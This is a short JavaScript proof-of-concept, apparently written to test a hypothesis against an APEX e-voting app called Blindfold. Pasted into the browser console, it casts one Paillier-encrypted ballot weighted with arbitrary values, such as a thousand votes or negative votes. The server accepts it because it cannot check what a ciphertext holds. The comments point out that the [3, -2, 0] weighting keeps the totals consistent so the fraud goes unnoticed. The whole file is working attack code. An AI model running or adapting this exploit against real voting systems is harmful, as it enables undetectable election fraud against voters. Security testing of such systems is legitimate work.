// APEX Blindfold - ballot stuffing from the browser console (hypothesis H4).
//
// Open the Vote page, open the browser console, paste this whole file, press Enter.
// It casts ONE ballot. That ballot is worth as many votes as WEIGHTS says,
// and the database accepts it, because it cannot see what a ciphertext holds.
//
// An honest ballot for option A is [1, 0, 0].
//   [1000, 0, 0]  one voter, a thousand votes for A: the totals stop adding up to the turnout
//   [3, -2, 0]    three votes for A, minus two for B: the totals still add up, nobody notices
(async () => {
  const VOTER = 'VOTER-0012'; // a registered voter code that has not voted yet
  const WEIGHTS = [1000, 0, 0]; // what the three ciphertexts encrypt, for options A, B, C

  const base = document.querySelector('script[src*="blindfold/boot.js"]').src.replace(/boot\.js.*$/, '');
  const P = await import(`${base}paillier.js`);
  const call = (name, data) => new Promise((resolve, reject) => {
    apex.server.process(name, data, { dataType: 'json', success: resolve, error: (xhr, status, message) => reject(new Error(message || status)) });
  });

  const info = await call('ELECTION_INFO', {});
  const key = P.publicKeyFromN(P.fromHex(info.n_hex));
  // Plaintexts live modulo n, so a negative weight is n minus its absolute value.
  const plaintext = (weight) => ((BigInt(weight) % key.n) + key.n) % key.n;
  const ballot = WEIGHTS.map((weight) => P.ciphertextToHex(key, P.encrypt(key, plaintext(weight))));

  const answer = await call('CAST_BALLOT', { x01: VOTER, f01: ballot });
  console.log(`Ballot for ${VOTER} with weights [${WEIGHTS.join(', ')}]. The database answered:`, answer);
  return answer;
})();
